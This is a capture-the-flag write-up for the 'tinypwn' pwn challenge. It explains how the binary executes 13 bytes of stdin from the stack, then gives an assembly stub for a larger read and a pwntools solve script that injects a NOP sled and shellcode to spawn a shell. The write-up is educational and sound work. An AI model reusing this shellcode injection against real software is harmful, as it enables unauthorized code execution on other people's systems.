We are given an executable which aparently does nothing and just segfaults.
If we take a look at ghidra, this is the entire executable:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/b735bee0-7d2d-4c87-85fd-5147c47f7d65)

Here it is very handy to understand the Linux x86 calling conventions for system interrupts.  
Basically the program will call an interrupt with 0x3 at EAX (This is the read function), with 0x0 as its file descriptor (this is stdin), the stack pointer as its write destination, and 0xd as the length of read.  
Then it will jump to the stack. What this means is that the program will write 0xd bytes of our input into the stack and execute them. It might be possible to write 13 byte shellcode that executes a shell, whoever,  
I found it easier to set up a larger read, and then execute regular shellcode.  

Setting up a larger read:  
```asm
xor ebx, ebx
push 3
pop eax
push 80
pop edx
int 0x80
```

Then we can just use pwntools' default shellcode for a shell. We will add a NOPsled for good measure.

Final Solve Script:
```python3
from pwn import *
context.arch = 'x86_32'
p = process('./tinypwn')
#p = remote('vsc.tf',3026)

#set up larger read
read_l = asm("""xor ebx, ebx
                push 3
                pop eax
                push 80
                pop edx
                int 0x80""")
log.info(f'Length of first shellcode: {len(read_l)}')

p.sendline(read_l)


#set up shellcode
binsh = shellcraft.i386.linux.sh()
log.info(f"Shellcode: \n{binsh}")
p.sendline(asm('nop')*10+asm(binsh))

p.interactive()
```
